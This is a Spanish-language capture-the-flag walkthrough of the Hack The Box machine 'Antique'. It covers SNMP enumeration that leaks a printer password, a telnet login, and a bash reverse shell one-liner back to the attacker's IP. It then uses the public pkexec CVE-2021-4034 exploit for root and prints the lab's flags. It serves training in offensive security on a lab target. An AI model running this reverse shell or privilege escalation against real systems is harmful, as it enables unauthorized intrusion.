---
layout: single
title: Antique - Hack The Box
excerpt: "Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to >
date: 2024-04-02
classes: wide
header:
  teaser: /assets/images/htb-antique/antique.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Pkexec
  - UDP
  - SNMP
---

![](/assets/images/htb-antique/antique.png)

Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root >

## Portscan

```
 Nmap 7.94SVN scan initiated Tue Apr  2 17:03:02 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allports 10.10.11.107
 Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.107 ()   Status: Up
Host: 10.10.11.107 ()   Ports: 23/open/tcp//telnet///   Ignored State: closed (65534)
 Nmap done at Tue Apr  2 17:03:14 2024 -- 1 IP address (1 host up) scanned in 12.38 seconds
```
Y con esto analizamos los puertos abiertos:
```
nmap -sCV -p23 -Pn 10.10.11.107 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 17:07 CEST
Nmap scan report for 10.10.11.107
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServer>
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data.

```
Vamos a analizar tambien los puertos UDP:
```
sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107                              1 ⨯
[sudo] contraseña para kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 17:21 CEST
Initiating Ping Scan at 17:21
Scanning 10.10.11.107 [4 ports]
Completed Ping Scan at 17:21, 0.06s elapsed (1 total hosts)
Initiating UDP Scan at 17:21
Scanning 10.10.11.107 [100 ports]
Warning: 10.10.11.107 giving up on port because retransmission cap hit (2).
Discovered open port 161/udp on 10.10.11.107
Completed UDP Scan at 17:21, 9.96s elapsed (100 total ports)
Nmap scan report for 10.10.11.107
Host is up (0.11s latency).
Not shown: 86 open|filtered udp ports (no-response), 13 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
           Raw packets sent: 369 (22.540KB) | Rcvd: 17 (1.327KB)
```
## Intrusión SNMP


Vemos que el puerto abierto tiene un servicio snmp, asi que vamos a investigarlo:
```
snmpwalk -c public -v2c 10.10.11.107 1
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
Vemos que esta en hexadecimal y vamos a pasarlo de un modo que sea legible:
```
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5
```
## Entramos con telnet en el puerto 443

Lo ponemos:
```
telnet 10.10.11.107 23
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect


Password: P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i
```
Vemos que se puede ejecutar comandos con exec asi que vamos a pasarnos una bash:
```
exec bash -c "bash -i >& /dev/tcp/10.10.16.14/443 0>& 1"
```

Ya podemos sacar la flag de usuario:
```
lp@antique:~$ cat user.txt
cat user.txt
15223601059755aab2544f81cdc59707
```
## Escalada de privilegios

Vamos a ver si encontramos la debilidad pkexec, que se puede explotar
```
lp@antique:~$ which pkexec
/usr/bin/pkexec
```

Desde nuestra terminal, vamos a clonarnos este repositorio https://github.com/berdav/CVE-2021-4034 que nos va a escalar el privilegio mediante pkexec, la comprimimos en .tar.gz (Ya que zip no esta en la maquina víctima).Desde el equipo de la víctima, obtenemos el comprimido de nuestro equipo(wget http:>
```
lp@antique:/tmp/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
# bash
root@antique:/tmp/CVE-2021-4034# cd/root
bash: cd/root: No such file or directory
root@antique:/tmp/CVE-2021-4034# cd /root
root@antique:/root# ls
config.py  root.txt  snap  snmp-server.py
root@antique:/root# cat root.txt
4202c54a001f14e922c8d8ae918b8ac0
```
